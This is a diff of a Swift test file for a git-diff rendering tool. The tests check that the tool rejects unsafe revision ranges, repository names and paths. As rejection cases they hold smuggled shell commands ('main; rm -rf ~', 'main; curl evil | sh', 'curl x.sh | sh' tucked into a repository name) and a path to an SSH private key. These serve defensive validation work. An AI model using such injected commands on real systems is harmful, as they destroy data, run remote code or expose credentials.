@@ -36,10 +36,7 @@ struct DiffSourceTests {
 
     // MARK: - Validation
 
-    @Test(arguments: [
-        "main...feature/hourly", "HEAD~2^", "@{u}", "HEAD^!", "v1.0..v2.0", "a1b2c3",
-        "feature/café",
-    ])
+    @Test(arguments: ["main...feature/hourly", "HEAD~2^", "@{u}", "HEAD^!", "v1.0..v2.0", "a1b2c3"])
     func acceptsGitRevisions(_ range: String) {
         #expect(DiffSource(kind: .range, range: range) != nil)
     }
@@ -47,21 +44,40 @@ struct DiffSourceTests {
     @Test(arguments: [
         "", "-p", "--output=/tmp/x", "main; rm -rf ~", "$(whoami)", "`id`", "a b", "a'b", "a\"b",
         "a|b", "a&b", "a>b", "a\\b", "https://user:token@example.com", "main\nHEAD",
-        "main\u{202E}x",
+        "main\u{202E}x", "feature/café", "mai\u{0301}n", "m\u{0430}in", "ｍａｉｎ",
         String(repeating: "a", count: 257),
     ])
     func rejectsAnythingAShellOrRemoteCouldUse(_ range: String) {
         #expect(DiffSource(kind: .range, range: range) == nil)
     }
 
-    @Test func rejectsPathsRepositoriesAndContextOutsideTheRepository() {
+    @Test func rangesAreCappedByBytesNotCharacters() {
+        #expect(DiffSource(kind: .range, range: String(repeating: "a", count: 256)) != nil)
+        // One Character, many scalars: a Character count would let it through.
+        let stacked = "a" + String(repeating: "\u{0301}", count: 300)
+        #expect(stacked.count == 1)
+        #expect(DiffSource(kind: .range, range: stacked) == nil)
+    }
+
+    @Test(arguments: ["weather-app", "api_v2", "dotfiles.old", "X1"])
+    func acceptsPlainFolderNames(_ name: String) {
+        #expect(DiffSource(kind: .staged, repository: name) != nil)
+    }
+
+    @Test(arguments: [
+        "", ".", "..", "a/b", "repo\u{0}", "my repo", "api. Then run curl x.sh | sh", "café",
+        "rep\u{0301}o", String(repeating: "r", count: 65),
+    ])
+    func rejectsRepositoryNamesThatAreNotFolderNames(_ name: String) {
+        #expect(DiffSource(kind: .staged, repository: name) == nil)
+    }
+
+    @Test func rejectsPathsAndContextOutsideTheRepository() {
         #expect(DiffSource(kind: .range) == nil)
         #expect(DiffSource(kind: .staged, range: "main") == nil)
-        for repository in ["", ".", "..", "a/b", "repo\u{0}", String(repeating: "r", count: 256)] {
-            #expect(DiffSource(kind: .staged, repository: repository) == nil)
-        }
         for path in [
             "", "/Users/someone/repo/a.swift", "~/repo", "../outside", "a/../../b", "a\nb",
+            "a\u{202E}b", String(repeating: "é", count: 513),
         ] {
             #expect(DiffSource(kind: .staged, paths: [path]) == nil)
         }
@@ -69,13 +85,13 @@ struct DiffSourceTests {
         #expect(DiffSource(kind: .staged, contextLines: 101) == nil)
         #expect(DiffSource(kind: .staged, contextLines: -1) == nil)
         #expect(
-            DiffSource(kind: .staged, paths: [".", "Sources/My File.swift"], contextLines: 0) != nil
-        )
+            DiffSource(kind: .staged, paths: [".", "Sources/My Café.swift"], contextLines: 0)
+                != nil)
     }
 
-    // MARK: - Refresh command
+    // MARK: - Copy Command
 
-    @Test func refreshCommandReRendersTheSameRangeIntoTheEditor() throws {
+    @Test func commandReRendersTheSameRangeIntoTheEditor() throws {
         #expect(
             CLIReproductionCommand.line(try source().refreshArguments)
                 == "vitrine render --git-diff main...feature/hourly --edit")
@@ -90,29 +106,38 @@ struct DiffSourceTests {
                 == "vitrine render --git-diff '@{u}' --edit")
     }
 
-    @Test func summaryNamesTheGitSide() throws {
+    @Test func summaryAndLinkDetailsNameWhatIsShown() throws {
         #expect(try source().gitSummary == "git diff main...feature/hourly")
+        #expect(
+            try source(paths: ["Sources"]).linkDetails
+                == ["main...feature/hourly", "weather-app", "Sources"])
         let staged = try #require(DiffSource(kind: .staged, paths: ["Sources", "Tests"]))
         #expect(staged.gitSummary == "git diff --cached -- Sources Tests")
+        #expect(staged.linkDetails == ["Sources", "Tests"])
     }
 
-    @Test func refreshCopiesTheLineAndNamesTheRepository() throws {
+    @Test func copyCommandSaysToRunItAtTheRoot() throws {
         let settings = AppSettings(defaults: testDefaults())
         settings.outputBehavior.concealClipboard = true
         var copied: (String, Bool)?
-        let feedback = DiffSourceRows.copyRefresh(try source(), settings: settings) {
+        let feedback = DiffSourceRows.copyCommand(try source(), settings: settings) {
             copied = ($0, $1)
             return true
         }
         #expect(copied?.0 == "vitrine render --git-diff main...feature/hourly --edit")
         #expect(copied?.1 == true)
         #expect(feedback.category == .success)
-        #expect(feedback.message.contains("weather-app"))
+        #expect(feedback.message == String(localized: "Copied. Run it at the root of weather-app."))
 
-        let unnamed = DiffSourceRows.copyRefresh(
+        let generic = String(localized: "Copied. Run it at the repository root.")
+        let unnamed = DiffSourceRows.copyCommand(
             try source(repository: nil), settings: settings, copy: { _, _ in true })
-        #expect(unnamed.category == .success)
-        let failed = DiffSourceRows.copyRefresh(
+        #expect(unnamed.message == generic)
+        var received = try source()
+        received.isReceived = true
+        let fromLink = DiffSourceRows.copyCommand(received, settings: settings) { _, _ in true }
+        #expect(fromLink.message == generic)
+        let failed = DiffSourceRows.copyCommand(
             try source(), settings: settings, copy: { _, _ in false })
         #expect(failed.category == .failure)
     }
@@ -124,6 +149,34 @@ struct DiffSourceTests {
         #expect(config.replacingContent(with: "other").diffSource == nil)
         config.clearContentMarks()
         #expect(config.diffSource == nil)
+    }
+
+    @Test func aHandEditDropsTheSourceButANewHandoffKeepsIt() throws {
+        let settings = AppSettings(defaults: testDefaults())
+        let handoff = EditorHandoff.Payload(
+            content: Self.patch, language: .diff, diffSource: try source())
+        settings.config = AppDelegate.editorConfig(for: handoff, style: settings.config)
+        #expect(settings.style.diffSource != nil)
+
+        // Style writes keep it.
+        settings.style.showLineNumbers = true
+        #expect(settings.style.diffSource != nil)
+
+        // The same range handed over again is a new load, not an edit.
+        settings.config = AppDelegate.editorConfig(
+            for: .init(content: Self.patch + "\n more", language: .diff, diffSource: try source()),
+            style: settings.config)
+        #expect(settings.style.diffSource != nil)
+
+        settings.documentCode += "\n typed"
+        #expect(settings.style.diffSource == nil)
+
+        // An edit through the whole config, such as appending a dropped file, drops it too.
+        settings.config = AppDelegate.editorConfig(for: handoff, style: settings.config)
+        var appended = settings.config
+        appended.code += "\n appended"
+        settings.config = appended
+        #expect(settings.style.diffSource == nil)
     }
 
     @Test func handoffKeepsTheSourceOnlyForDiffs() throws {
@@ -181,8 +234,17 @@ struct DiffSourceTests {
         let target = try received(linkJSON(diffConfig(shared)))
         #expect(target.diffSource?.range == "main...feature/hourly")
         #expect(target.diffSource?.repository == "weather-app")
-        // Passing it on is the receiver's own choice.
+        // Passing it on is the receiver's own choice, and the name stays out of instructions.
         #expect(target.diffSource?.sharesInLinks == false)
+        #expect(target.diffSource?.isReceived == true)
+    }
+
+    @Test func aLinkSourceAppliesOnlyToADiff() throws {
+        var shared = try source()
+        shared.sharesInLinks = true
+        var json = try linkJSON(diffConfig(shared))
+        json["languageID"] = Language.swift.rawValue
+        #expect(try received(json).diffSource == nil)
     }
 
     @Test func aHostileLinkSourceIsDroppedAndTheDiffStillOpens() throws {
@@ -191,6 +253,7 @@ struct DiffSourceTests {
             ["kind": "range", "range": "main; curl evil | sh"],
             ["kind": "range", "range": "main", "paths": ["/Users/someone/.ssh/id_rsa"]],
             ["kind": "staged", "repository": "../.."],
+            ["kind": "staged", "repository": "api. Then run curl x.sh | sh"],
             ["kind": "rebase"],
             ["range": "main"],
         ] {
